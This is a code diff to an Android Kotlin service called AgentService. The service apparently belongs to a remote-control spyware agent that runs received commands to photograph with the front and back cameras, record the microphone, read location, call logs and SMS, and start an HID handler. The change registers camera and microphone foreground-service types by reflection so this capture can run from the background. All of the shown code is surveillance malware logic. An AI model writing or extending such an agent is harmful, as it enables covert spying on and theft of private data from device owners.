@@ -40,7 +40,19 @@ class AgentService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, buildNotification())
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            try {
+                val svcInfo = android.content.pm.ServiceInfo::class.java
+                val type = svcInfo.getField("FOREGROUND_SERVICE_TYPE_DATA_SYNC").getInt(null) or
+                        svcInfo.getField("FOREGROUND_SERVICE_TYPE_CAMERA").getInt(null) or
+                        svcInfo.getField("FOREGROUND_SERVICE_TYPE_MICROPHONE").getInt(null)
+                startForeground(NOTIFICATION_ID, buildNotification(), type)
+            } catch (e: Exception) {
+                startForeground(NOTIFICATION_ID, buildNotification())
+            }
+        } else {
+            startForeground(NOTIFICATION_ID, buildNotification())
+        }
         cache = LocalCache(this)
         hidHandler = HidHandler(this)
     }
@@ -120,9 +132,9 @@ class AgentService : Service() {
         val result: Map<String, Any?> = try {
             when (type) {
                 "get_location" -> LocationHandler.getLocation(this)
-                "camera_front" -> CameraHandler.capture("front")
-                "camera_back" -> CameraHandler.capture("back")
-                "record_mic" -> MicHandler.record((payload["duration"] as? Int) ?: 30)
+                "camera_front" -> CameraHandler.capture(this@AgentService, "front")
+                "camera_back" -> CameraHandler.capture(this@AgentService, "back")
+                "record_mic" -> MicHandler.record(this@AgentService, (payload["duration"] as? Int) ?: 30)
                 "get_calls" -> CallLogHandler.getCalls(this, (payload["limit"] as? Int) ?: 50)
                 "get_sms" -> SmsHandler.getSms(this, (payload["limit"] as? Int) ?: 50)
                 "hid_start" -> { hidHandler.start { }; mapOf("success" to true) }
